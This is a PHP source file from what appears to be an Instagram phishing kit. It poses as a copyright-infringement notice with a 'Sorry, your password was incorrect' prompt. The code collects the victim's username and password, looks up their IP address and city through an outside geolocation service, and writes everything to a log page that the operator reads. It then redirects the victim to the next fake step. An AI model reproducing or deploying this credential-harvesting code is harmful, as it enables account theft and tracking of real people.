<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);
 
include('home/bar.php'); 

if ($_POST) {
    $zwous = $_SESSION["zwous"];
    $zwoup =  $_POST['zwoup'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
    $sehir = $details->city;
    date_default_timezone_set('Europe/Istanbul');
    $tarih = date("d-m-Y H:i:s");
	$file = fopen('tcm.php', 'a');
       fwrite($file, "


<html>
<head>
    <meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>
<meta http-equiv="refresh" content="30; url=https://www.instagram.com/oyusufcelik/">
<title>Log | <?php echo date('d.m.Y H:i:s') ?></title>
</head>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<font color='pink'> Wrong Sayfası: </font><br>
<font color='red'> Kullanıcı Adı: </font><font color='white'>".$zwous."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$zwoup."</font><br>


<font color='red'> Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'> Şehir: </font><font color='white'>".$sehir."</font><br>
<font color='red'> Tarih: </font><font color='white'>".$tarih."</font><br>
<hr />

");

fclose($file);
echo '';

  
  header("Location: copyright-reason.php");
  include 'vendor/security.php';
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="panel/img/head.ico">
    <title>Copyright | İnfringement</title>
    <link href="panel/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="panel/zew/css/style.css" rel="stylesheet">

</head>
<header>
		<br>
	<img style="
  display: block;
  margin-left: auto;
  margin-right: auto;
  margin-top:1.3%;
  "
  src="panel/img/head.gif" width="200px">

	</header>
		<br>
<body>


<div class="row">
    <div class="col-md-6 col-md-offset-3">
        <div id="zewform">  
            <ul id="progressbar">
                <li class="active">İnformation</li>
                <li class="active">User Details</li>
                <li class="active">Copyright Reason</li>  
                <li>Form Status</li>

            </ul>

         
           <form autocomplete="off" method="post" enctype="multipart/form-data">
			 
			<div class="zewbox">
                <h2 class="fs-title">incorrect entry
</h2>
  <style>
.user-resim img {
            margin-top: 10px;
            border-radius: 50%;
            height: 60px;
			float: left ;
			margin-left:10px;

        }

</style>
  <div class="user-resim">
            <img src="<?= $pp ?>"> <h4 style="
			float: left ;
			margin:20px 0px 0px 10px;
			font-weight: bold;"><?php echo " " . $name; ?></h4>
			
			
           
        </div>
               <style>
	 .box {
            display: flex;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            width: 100%;
            height: 100%;
        }

        .box table {
            margin-top: 16px;
            border: 2px solid transparent;
            border-radius: 5px;
			font-weight:bold; 
            padding: 10px;
            list-style: none;
        }

        .box table td {
            padding: 5px 20px;
        }
	</style>
<div class="box">

            <table>
                <thead>
                    <tr>
                        <td><?php echo $gonderi; ?></td>
                        <td><?php echo $takipci; ?></td>
                        <td><?php echo $takip; ?></td>
                    </tr>
                </thead>
                <tbody>
                    <tr>
                    
                    </tr>
                </tbody>
            </table>
        </div>
		<br>
                <input type="password" required    name="zwoup" placeholder="Password"/>
<br>
		 <div style="color:#f00; font-weight: bold;">Sorry, your password was incorrect. Please double-check your password.</div>
		 <br>
				 <input type="submit" value="Next" class="action-button">
				 


        </form>
</div>

    </div>
	<!--boş-->
	<br><br><br><br>
</div>

 
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.3/jquery.easing.min.js'></script>

<script src="panel/bootstrap/js/bootstrap.min.js"></script>
<script src="panel/zew/js/zewform.js"></script>

<div class="footer">
  <p>© 2022 from Instagram</p>
</div>
</body>

</html>
